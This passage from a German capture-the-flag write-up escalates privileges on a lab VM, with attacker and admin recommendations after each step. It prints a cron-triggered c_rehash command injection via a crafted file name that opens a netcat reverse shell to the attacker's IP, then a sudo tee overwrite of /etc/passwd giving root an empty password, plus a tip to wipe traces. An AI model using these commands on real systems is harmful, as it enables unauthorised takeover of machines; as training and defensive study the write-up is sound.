+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for www-data: 
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich habe `sudo -l` ausgeführt, um zu prüfen, ob der `www-data`-Benutzer irgendwelche Befehle mit `sudo` ausführen darf. Das System fragt nach einem Passwort, das ich nicht habe. Dies bedeutet, dass `www-data` wahrscheinlich keine `NOPASSWD`-Sudo-Rechte hat.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein erwartetes Ergebnis. Es wäre eine schwere Fehlkonfiguration, dem `www-data`-Benutzer passwortlose sudo-Rechte zu gewähren. Ich muss nach anderen Wegen suchen, um meine Rechte zu erweitern. Dazu gehören die Suche nach SUID-Binaries, schlecht konfigurierten Cron-Jobs, Kernel-Exploits oder ausnutzbaren Diensten, die lokal laufen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Auch wenn `sudo -l` ein Passwort verlangt, ist es ein wichtiger Test. Manchmal haben Benutzer schwache oder wiederverwendete Passwörter. Da hier kein Passwort bekannt ist, muss die Suche nach anderen Vektoren für die Privilegienerweiterung fortgesetzt werden.<br><strong>Empfehlung (Admin):</strong> Dies ist die korrekte Konfiguration. Dienstkonten sollten niemals `sudo`-Rechte haben, es sei denn, es ist absolut und nachweislich notwendig. Wenn sie benötigt werden, sollten sie auf spezifische Befehle und ohne die `NOPASSWD`-Option beschränkt sein.</p>
+        </section>
+        
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@cve-pt1:~/cve$ cat 2021-4118.py 
+#!/usr/bin/env python3
+
+from pytorch_lightning import core
+core.saving.load_hparams_from_yaml("/var/www/cve/file.yaml")
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Bei der Erkundung des Webserver-Verzeichnisses `/var/www/cve` fand ich ein Python-Skript namens `2021-4118.py`. Der Inhalt dieses Skripts ist aufschlussreich: Es importiert die `pytorch_lightning` Bibliothek und ruft die Funktion `load_hparams_from_yaml` auf, um die Datei `/var/www/cve/file.yaml` zu laden. Dies bestätigt, wie mein Exploit ausgelöst wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Skript bestätigt exakt meine Annahmen. Es ist wahrscheinlich, dass ein Cron-Job oder ein anderer automatisierter Prozess dieses Skript regelmäßig ausführt, was wiederum die `file.yaml` parst und somit meinen Payload getriggert hat. Obwohl mir dies nicht direkt bei der Privilegienerweiterung hilft, gibt es mir ein tieferes Verständnis der Systemarchitektur.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie immer den Quellcode von Anwendungen, die Sie auf dem Zielsystem finden. Sie können Hinweise auf die Funktionsweise, Konfigurationsdateien, Passwörter oder logische Fehler enthalten. Dieses Wissen kann für spätere Phasen des Angriffs entscheidend sein.<br><strong>Empfehlung (Admin):</strong> Sorgen Sie für eine sichere Code-Verwaltung. Lassen Sie keine alten, ungenutzten oder Test-Skripte auf Produktionsservern liegen. Jedes Skript stellt eine potenzielle Angriffsfläche dar und kann einem Angreifer wertvolle Informationen liefern.</p>
+			
+			            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@cve-pt1:/etc$ grep -r wicca 2>/dev/null 
+<span class="command">group:wicca:x:1000:</span>
+<span class="command">group-:bluetooth:x:112:wicca</span>
+<span class="command">group-:wicca:x:1000:</span>
+<span class="command">cron.d/cve1:*/1 * * * * wicca c_rehash /etc/ssl/certs/</span>
+<span class="command">cron.d/cve1:*/1 * * * * wicca sleep 30; c_rehash /etc/ssl/certs/</span>
+<span class="command">passwd-:wicca:x:1000:1000:wicca,,,:/home/wicca:/bin/bash</span>
+<span class="command">passwd:wicca:x:1000:1000:wicca,,,:/home/wicca:/bin/bash</span>
+<span class="command">subuid:wicca:100000:65536</span>
+<span class="command">subgid:wicca:100000:65536</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Bei der weiteren Enumeration des Systems habe ich das `/etc`-Verzeichnis nach dem Benutzernamen `wicca` durchsucht, da ich diesen zuvor im `/home`-Verzeichnis entdeckt hatte. Der `grep`-Befehl lieferte mehrere interessante Ergebnisse. Am wichtigsten sind die beiden Zeilen in `cron.d/cve1`: Jede Minute führt der Benutzer `wicca` den Befehl `c_rehash /etc/ssl/certs/` aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein kritischer Fund für die Privilegienerweiterung. Ein Cron-Job, der als ein anderer Benutzer (`wicca`) läuft und auf ein Verzeichnis zugreift, in das ich möglicherweise schreiben kann, ist ein klassischer Vektor. Der `c_rehash`-Befehl (Teil von OpenSSL) erstellt symbolische Links für Zertifikate. Eine bekannte Schwachstelle (CVE-2022-1292) in älteren OpenSSL-Versionen erlaubt es, durch speziell präparierte Dateinamen in diesem Verzeichnis beliebigen Code auszuführen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie immer nach Cron-Jobs, insbesondere nach solchen, die von anderen Benutzern ausgeführt werden. Prüfen Sie die Berechtigungen der Verzeichnisse und Skripte, die von Cron-Jobs verwendet werden. Wenn ein Cron-Job ein Tool mit bekannten Schwachstellen ausführt, ist dies ein hochwahrscheinlicher Weg zur Privilegienerweiterung.<br><strong>Empfehlung (Admin):</strong> Überprüfen und härten Sie alle Cron-Jobs. Stellen Sie sicher, dass sie mit den geringstmöglichen Rechten laufen. Halten Sie System-Tools wie OpenSSL immer auf dem neuesten Stand, um bekannte Schwachstellen wie CVE-2022-1292 zu mitigieren. Verzeichnisse, die von Cron-Jobs verarbeitet werden, sollten nicht von unprivilegierten Benutzern wie `www-data` beschreibbar sein.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Um die Schwachstelle CVE-2022-1292 in `c_rehash` auszunutzen, habe ich in das Verzeichnis `/etc/ssl/certs` gewechselt, da der Cron-Job dort ausgeführt wird und ich als `www-data` Schreibrechte in diesem Verzeichnis haben könnte (eine häufige Fehlkonfiguration). Ich habe eine speziell präparierte Datei erstellt. Der Dateiname enthält Backticks (``), die vom Shell-Interpreter als Befehlssubstitution interpretiert werden. Der Befehl innerhalb der Backticks `nc -c sh 192.168.2.199 5555` startet eine weitere Reverse Shell zu meinem Angreifer-System auf Port 5555, diesmal jedoch mit den Rechten des Benutzers, der den Cron-Job ausführt – `wicca`.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@cve-pt1:/etc/ssl/certs$ echo "-----BEGIN CERTIFICATE-----" > "hey.crt<span class="password">`nc -c sh 192.168.2.199 5555`</span>"
+</pre>
+                </div>
+            </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt ist der Schlüssel zur Übernahme des `wicca`-Benutzerkontos. Sobald der Cron-Job das nächste Mal läuft (innerhalb von einer Minute), wird `c_rehash` versuchen, diese Datei zu verarbeiten. Die Shell interpretiert den Dateinamen, führt den `nc`-Befehl aus und stellt die Shell-Verbindung her.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Command-Injection über Dateinamen ist eine raffinierte Technik. Sie funktioniert in Szenarien, in denen ein Programm (oft in einem Cron-Job) Shell-Befehle mit Dateinamen als Argumenten unsicher zusammenbaut. Halten Sie immer einen zweiten Listener bereit, um die neue Shell zu fangen.<br><strong>Empfehlung (Admin):</strong> Validieren Sie Dateinamen strikt und verwenden Sie in Skripten niemals Methoden, die Dateinamen direkt in einer Shell auswerten. Führen Sie Programme mit Optionen aus, die klar anzeigen, dass ein Argument eine Datei ist und nicht interpretiert werden soll. Die Berechtigungen für Systemverzeichnisse wie `/etc/ssl/certs` sollten extrem restriktiv sein.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div>
+                    <pre>
+listening on [any] 5555 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.212] 34372</span>
+
+wicca@cve-pt1:/etc/ssl/certs$
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Wie erwartet, hat der Cron-Job den Payload ausgelöst. Mein Listener auf Port 5555 hat eine eingehende Verbindung vom Zielserver erhalten. Die neue Shell läuft nun, wie der Prompt `wicca@cve-pt1` zeigt, als Benutzer `wicca`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Hervorragend. Die erste Stufe der Privilegienerweiterung von `www-data` zu `wicca` ist abgeschlossen. Ich habe nun die Berechtigungen eines regulären Benutzers, was mir Zugriff auf dessen Home-Verzeichnis und potenziell weitere `sudo`-Rechte verschafft.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wiederholen Sie sofort die grundlegenden Enumerationsschritte (`id`, `sudo -l`) als neuer Benutzer. Suchen Sie im Home-Verzeichnis nach Skripten, Passwörtern, SSH-Schlüsseln und anderen sensiblen Informationen.<br><strong>Empfehlung (Admin):</strong> Dieser Vorfall zeigt eine Verkettung von Schwachstellen: beschreibbares Systemverzeichnis, ein unsicherer Cron-Job und eine veraltete Softwareversion. Das Beheben einer dieser Schwachstellen hätte den Angriff gestoppt. Ein mehrschichtiger Verteidigungsansatz (Defense in Depth) ist entscheidend.</p>
+            
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+wicca@cve-pt1:/etc/ssl/certs$ sudo -l
+Matching Defaults entries for wicca on cve-pt1:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User wicca may run the following commands on cve-pt1:
+<span class="password">    (root) NOPASSWD: /usr/bin/tee</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `wicca` habe ich erneut `sudo -l` ausgeführt. Diesmal ist das Ergebnis sehr vielversprechend: Der Benutzer `wicca` darf den Befehl `/usr/bin/tee` als `root` ohne Passwort ausführen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der direkte Weg zu vollen Root-Rechten. `tee` ist ein Programm, das von der Standardeingabe liest und in Dateien schreibt. Da ich es als `root` ausführen kann, kann ich in jede beliebige Datei auf dem System schreiben, einschließlich kritischer Systemdateien wie `/etc/passwd` oder `/etc/sudoers`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> GTFOBins ist die erste Anlaufstelle, wenn Sie auf eine `sudo`-Regel stoßen. Suchen Sie nach dem Binary (hier `tee`) und prüfen Sie, ob es für die Privilegienerweiterung missbraucht werden kann. Der klassische Angriff hier ist das Überschreiben von `/etc/passwd`, um einem Benutzer ein leeres Passwort zu geben.<br><strong>Empfehlung (Admin):</strong> Gewähren Sie `sudo`-Rechte nur für Befehle, die nicht zum Schreiben in beliebige Dateien oder zum Ausführen weiterer Befehle missbraucht werden können. Programme wie `tee`, `dd`, `vim`, `awk`, `find` und viele andere sind extrem gefährlich, wenn sie in `sudo`-Regeln ohne strikte Einschränkungen verwendet werden.</p>
+            
+            <p class="analysis"><strong>Analyse:</strong> Um die `sudo`-Regel auszunutzen, habe ich den Inhalt der `/etc/passwd`-Datei genommen und den Eintrag für `root` modifiziert. Ich habe das `x`, das den Passwort-Hash repräsentiert, entfernt (`root::0:0...`). Dies setzt effektiv ein leeres Passwort für den `root`-Benutzer. Anschließend habe ich diesen neuen Inhalt über eine Pipe an `sudo tee /etc/passwd` weitergeleitet. `tee` schreibt als `root` den neuen Inhalt in die `/etc/passwd`-Datei und überschreibt die alte Version.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+wicca@cve-pt1:~$ echo "root::0:0:root:/root:/bin/bash
+... (rest of passwd file) ..." | sudo tee /etc/passwd
+</pre>
+                </div>
+            </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein sauberer und effektiver Angriff. Das System erlaubt nun einen Login als `root` ohne Passwort. Der Weg zur vollständigen Kontrolle ist frei.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Bearbeiten von `/etc/passwd` ist eine gängige, aber "laute" Technik. Eine subtilere Methode wäre, `/etc/sudoers` zu bearbeiten, um dem eigenen Benutzer (`wicca`) volle `sudo`-Rechte zu geben. Beide Methoden führen jedoch zum Ziel.<br><strong>Empfehlung (Admin):</strong> Setzen Sie Dateintegritäts-Überwachungssysteme (z.B. AIDE, Tripwire) ein. Diese würden eine nicht autorisierte Änderung an kritischen Dateien wie `/etc/passwd` sofort erkennen und alarmieren.</p>
+            
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+wicca@cve-pt1:~$ su -
+<span class="password">root@cve-pt1:~#</span> 
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Mit dem modifizierten `/etc/passwd`-Eintrag konnte ich einfach den Befehl `su -` verwenden, um ohne Passwort zur `root`-Shell zu wechseln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch, der Root-Zugriff war erfolgreich! Ich habe nun die vollständige Kontrolle über das Zielsystem. Mein Ziel ist erreicht. Alle weiteren Aktionen, wie das Auslesen der finalen Flag-Datei, sind nun trivial.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nach Erlangung der Root-Rechte besteht der letzte Schritt darin, die Persistenz zu sichern (falls erforderlich), alle Spuren zu beseitigen und die gefundenen Flags zu dokumentieren. Führen Sie `id` aus, um die Root-Rechte zu bestätigen.<br><strong>Empfehlung (Admin):</strong> Die wichtigste Lehre hier ist die Gefahr von unsicheren `sudo`-Regeln. Eine einzige falsch konfigurierte Regel kann die gesamte Systemsicherheit zunichtemachen. Führen Sie regelmäßige Audits Ihrer `sudoers`-Konfiguration durch.</p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/wicca/user.txt</div>
+                    <div class="flag-value"><span class="password">HMVM{e49553320c33fa8866cddae2954ee228}</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">HMVM{5C42D6BB0EE9CE4CB7E7349652C45C4AH}</span></div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer class="footer">
+        <p>Ben - Cyber Security Reports</p>
+        <p>Berichtsdatum: 05. Juni 2025</p>
+    </footer>
+</body>
+</html>
